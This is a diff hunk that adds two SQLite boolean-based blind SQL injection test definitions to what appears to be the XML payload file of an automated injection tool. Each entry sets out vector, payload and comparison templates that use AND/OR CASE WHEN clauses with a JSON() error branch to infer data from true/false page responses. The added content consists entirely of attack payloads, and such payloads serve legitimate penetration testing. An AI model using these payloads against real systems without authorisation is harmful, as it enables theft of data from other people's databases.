@@ -596,6 +596,45 @@ Tag: <test>
             <dbms>Oracle</dbms>
         </details>
     </test>
+
+    <test>
+        <title>SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</vector>
+        <request>
+            <payload>AND CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</payload>
+        </request>
+        <response>
+            <comparison>AND CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</comparison>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</vector>
+        <request>
+            <payload>OR CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</payload>
+        </request>
+        <response>
+            <comparison>OR CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</comparison>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
     <!-- End of boolean-based blind tests - WHERE or HAVING clause -->
 
     <!-- Boolean-based blind tests - Parameter replace -->
